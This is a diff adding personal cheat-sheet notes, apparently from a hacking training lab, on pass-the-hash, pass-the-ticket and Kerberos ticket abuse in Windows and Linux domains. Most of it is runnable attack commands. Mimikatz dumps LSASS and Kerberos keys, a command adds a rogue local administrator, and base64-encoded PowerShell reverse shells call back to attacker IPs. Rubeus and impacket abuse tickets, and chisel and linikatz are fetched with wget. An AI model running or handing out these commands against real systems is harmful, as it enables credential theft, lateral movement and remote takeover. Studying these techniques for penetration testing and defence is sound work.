@@ -517,3 +517,333 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 cat md5-hashes.list
 hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
 ```
+
+# Pass the Hash (PtH)
+Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.
+
+### Mimikatz windows
+
+    /user - The user name we want to impersonate.
+    /rc4 or /NTLM - NTLM hash of the user's password.
+    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
+    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
+```powershell
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+# Pass the Hash with PowerShell Invoke-TheHash (Windows)
+When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
+
+    Target - Hostname or IP address of the target.
+    Username - Username to use for authentication.
+    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
+    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
+    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
+
+```powershell
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+# Reverse shell
+.\nc.exe -lvnp 8001
+```
+
+To generate reverse shell: [reverse shell generator](https://www.revshells.com/)
+Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).
+```powershell
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+```
+
+### Pass the hash with different tools Linux
+`impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
+`crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
+`crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
+`evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
+
+### Pass the Hash with RDP (Linux)
+We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
+
+There are a few caveats to this attack:
+
+    Restricted Admin Mode, which is disabled by default, should be enabled on the target host;
+This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:
+
+### Enable Restricted Admin Mode to Allow PtH
+`c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
+[Look tutorial](https://academy.hackthebox.com/module/147/section/1638)
+
+Pass the Hash Using RDP
+`xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`
+
+### UAC Limits Pass the Hash for Local Accounts
+
+UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
+
+step 1:
+dump lsass from control panel
+step 2:
+dump hashes with mimikatz using:
+`sekurlsa::minidump lsass.dmp`
+`sekurlsa::logonPasswords`
+
+great tutorial [here](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-dump-ntlm-hashes-crack-windows-passwords-0198268/)
+
+use the hashes to pth wherever
+to create the reverse shell:
+[reverse shell](https://www.revshells.com/)
+
+then:
+```powershell
+Import-Module .\Invoke-TheHash.psd1
+
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+```
+
+### Remember to use the correct IP address when creating the reverse shell... 
+
+# Pass the Ticket (PtT) from Windows
+Different Mimikatz attacks:
+
+Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
+
+```bash
+# Export tickets:
+privilege::debug
+sekurlsa::tickets /export
+
+dir *.kirbi
+
+# The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
+
+# Instead of mimikatz
+Rubeus.exe dump /nowrap
+
+# Mimikatz - Extract Kerberos Keys 
+privilege::debug
+sekurlsa::ekeys
+
+# Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus
+
+# Mimikatz - Pass the Key or OverPass the Hash
+privilege::debug
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+# Rubeus - Pass the Key or OverPass the Hash
+Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+# Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
+
+```
+
+### Pass the Ticket (PtT)
+```bash
+# Rubeus Pass the Ticket
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+
+# Rubeus - Pass the Ticket
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+
+### Convert .kirbi to Base64 Format
+`PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
+
+### Pass the Ticket - Base64 Format
+`c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>`
+
+Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.
+
+### Mimikatz - Pass the Ticket
+```bash
+privilege::debug
+
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+```
+
+### Mimikatz - PowerShell Remoting with Pass the Ticket
+```
+privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+c:\tools>powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+```
+
+### Rubeus - PowerShell Remoting with Pass the Ticket
+Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.
+
+Create a Sacrificial Process with Rubeus
+`C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`
+
+### Rubeus - Pass the Ticket for Lateral Movement
+`C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt`
+`c:\tools>powershell`
+`PS C:\tools> Enter-PSSession -ComputerName DC01`
+```
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+[DC01]: PS C:\Users\john\Documents> hostname
+DC01
+```
+
+# Pass the Tickent (PtT) from Linux
+`Linux Auth from MS01 image`: `<name>@<domain>@<IP>` : `david@inlenefreight.htb@<IP>`
+
+### Linux Auth port forwarding:
+`ssh david@inlanefreight.htb@10.129.204.23 -p 2222`
+
+### realm - Check If Linux Machine is Domain Joined
+```bash
+realm list
+
+# PS - Check if Linux Machine is Domain Joined
+ps -ef | grep -i "winbind\|sssd"
+
+# Using Find to Search for Files with Keytab in the Name
+find / -name *keytab* -ls 2>/dev/null
+
+# Identifying Keytab Files in Cronjobs
+crontab -l
+
+
+```
+
+Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
+
+### Finding ccached Files
+`env | grep -i krb5`
+
+As mentioned previously, ccache files are located, by default, at /tmp. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.
+
+`ls -la /tmp | grep -ni krb`
+
+### Listing keytab File Information
+`klist -k -t`
+
+### Impersonating a User with a keytab
+`klist `
+`kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`
+We can attempt to access the shared folder \\dc01\carlos to confirm our access.
+`smbclient //dc01/carlos -k -c ls`
+
+### Extracting Keytab Hashes with KeyTabExtract
+`python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab`
+
+For NTLM hashes, we can use [crackstation](https://crackstation.net/)
+
+### Login as carlos:
+`su - carlos@inlanefreight.htb`
+
+To abuse a ccache file, all we need is read privileges on the file. These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.
+
+Once we log in with the credentials for the user svc_workstations, we can use sudo -l and confirm that the user can execute any command as root. We can use the sudo su command to change the user to root.
+
+`ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222`
+`sudo -l`
+`ls -la /tmp`
+
+### Identifying Group Membership with the id Command
+`id julio@inlanefreight.htb`
+
+### Importing the ccache File into our Current Session
+```bash
+klist
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+smbclient //dc01/C$ -k -c ls -no-pass
+
+```
+
+### Using Linux Attack Tools with Kerberos
+To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as `Chisel` and `Proxychains` and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.
+
+`cat /etc/hosts`
+We need to modify our proxychains configuration file to use socks5 and port 1080.
+`cat /etc/proxychains.conf`
+
+```bash
+# Download and use chisel
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+sudo ./chisel server --reverse
+```
+
+Connect to MS01 via RDP and execute chisel (located in C:\Tools).
+`xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution`
+
+Execute chisel:
+`C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks`
+Note: The client IP is your attack host IP.
+
+### Setting the KRB5CCNAME Environment Variable
+`export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`
+
+### Impacket
+
+To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option `-no-pass`
+
+Using Impacket with proxychains and Kerberos Authentication
+`proxychains impacket-wmiexec dc01 -k`
+Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+
+Installing Kerberos Authentication Package
+`sudo apt-get install krb5-user -y`
+
+In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
+Kerberos Configuration File for INLANEFREIGHT.HTB
+```bash
+
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+
+<SNIP>
+```
+
+Now we can use evil-winrm.
+
+### Using Evil-WinRM with Kerberos
+`proxychains evil-winrm -i dc01 -r inlanefreight.htb`
+
+
+If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
+
+`impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`
+
+### Importing Converted Ticket into Windows Session with Rubeus
+`C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`
+`dir \\dc01\julio`
+
+### Linikatz is a similar tool as mimikats but for UNIX environments
+Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
+
+`wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh`
+`/opt/linikatz.sh`
+
+
+# Hard lab writeup
+`use crowbar to brute force rdp`
+assume you can extract an hash from everything
+
+We can use john to extract vhd hashes:
+```bash
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash
+cat backup.hash
+```
+
+how to mount bitlocker protected drive:
+[tutorial](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0)
+
+Then pass the hash 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:`e53d4d912d96874e83429886c7bf22a1`:::
+`evil-winrm -i 10.129.248.152 -u Administrator -H "e53d4d912d96874e83429886c7bf22a1"`
